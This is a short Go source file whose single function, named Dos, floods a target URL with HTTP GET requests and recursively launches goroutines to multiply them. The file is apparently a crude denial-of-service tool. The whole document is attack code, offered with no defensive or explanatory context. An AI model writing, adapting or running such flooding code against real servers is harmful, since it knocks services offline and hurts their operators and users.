package main

import (
	"fmt"
	"net/http"
)

func Dos(Target string) {

	var Count int = 0
	var ReqCount int = 10

	for {
		Count++
		Response, err := http.Get(Target)
		fmt.Println(Count, Target)
		if err != nil {
			fmt.Println(err)
			break
		}
		fmt.Println(Response.StatusCode)
		Response.Body.Close()
		if Count < ReqCount {
			go Dos(Target)
		} else {
			break
		}
	}
}
